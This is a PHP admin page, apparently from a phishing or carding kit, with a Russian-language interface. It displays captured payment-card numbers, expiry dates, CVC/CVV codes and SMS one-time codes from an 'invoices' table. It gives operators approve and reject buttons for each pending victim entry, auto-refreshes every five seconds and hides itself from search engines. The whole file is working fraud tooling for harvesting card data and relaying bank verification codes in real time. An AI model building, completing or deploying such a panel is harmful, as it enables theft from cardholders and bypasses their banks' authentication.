<?php
include '../system/main.php';

$query = "SELECT * FROM invoices ORDER BY id DESC LIMIT 25";
?>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Админка</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css"
          href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css"
          href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

    <link rel="stylesheet" href="css/main.css">

</head>
<body>
<div class="container py-5">
    <table class="table table-hover table-dark">
        <thead>
            <tr>
                <th scope="col">#</th>
                <th scope="col">Номер</th>
                <th scope="col">Дата</th>
                <th scope="col">CVC/CVV</th>
                <th scope="col">СМС-код</th>
                <th scope="col">Статус</th>
                <th scope="col">Действия</th>
            </tr>
        </thead>
        <tbody>
            <?php
            if ($result = $connection->query($query)) {

                while ($row = $result->fetch_assoc()) {
                    echo "<tr>";
                    echo '<th scope="row">'. $row['id'] .'</th>';
                    echo '<td>'. $row['card'] .'</td>';
                    echo '<td>'. $row['expiry'] .'</td>';
                    echo '<td>'. $row['cvc'] .'</td>';
                    echo '<td>'. $row['sms'] .'</td>';
                    echo '<td>';
                    switch($row['status']) {
                        case 1: echo "Ожидание"; break;
                        case 2: echo "Одобрено"; break;
                        case 3: echo "Ошибка"; break;
                    }
                    echo '</td>';
                    if($row['status'] == 1) {
                        echo '<td><div class="btn-group" role="group">
                              <form action="accept.php" method="post"><input type="hidden" name="id" value="' . $row['id'] . '"><button type="submit" class="btn btn-success">Одобрить</button></form>
                              <form action="error.php" method="post"><input type="hidden" name="id" value="' . $row['id'] . '"><button type="submit" class="btn btn-danger">Отклонить</button></form>
                              </div></td>';

                    } else echo "<td></td>";
                    echo "</tr>";
                }

                $result->free();
            }
            ?>
        </tbody>
    </table>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
        crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
        integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
        crossorigin="anonymous"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js"
        integrity="sha256-+4KHeBj6I8jAKAU8xXRMXXlH+sqCvVCoK5GAFkmb+2I=" crossorigin="anonymous"></script>

<script src="js/jquery.creditCardValidator.js"></script>

<?php echo '<script type="text/javascript" src="js/main.js?' . time() . '"></script>' ?>
<script type="text/javascript">
setTimeout(function(){
    window.location.reload(1);
}, 5000);
</script>

</body>
</html>